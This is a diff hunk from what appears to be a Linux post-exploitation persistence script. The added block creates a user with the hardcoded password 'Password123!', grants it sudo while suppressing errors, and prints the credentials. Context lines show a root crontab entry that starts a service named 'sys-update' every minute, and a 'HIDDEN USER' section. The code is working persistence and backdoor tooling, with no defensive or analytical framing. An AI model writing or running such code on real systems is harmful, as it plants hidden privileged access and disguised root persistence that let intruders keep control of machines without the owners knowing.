@@ -96,6 +96,24 @@ echo "* * * * * root systemctl start sys-update" >> /etc/crontab
 sleep 1
 
 ################################
+#         CREATE USER          # 
+################################
+
+echo "[+] creating new user"
+
+read -p "Your username: " USER
+
+useradd -m -s /bin/bash $USER
+
+echo "$USER:Password123!" | chpasswd
+
+usermod -aG sudo $USER 2>/dev/null
+
+echo "[+] user created -> $USER:Password123!"
+
+sleep 1
+
+################################
 #         HIDDEN USER          # 
 ################################
 
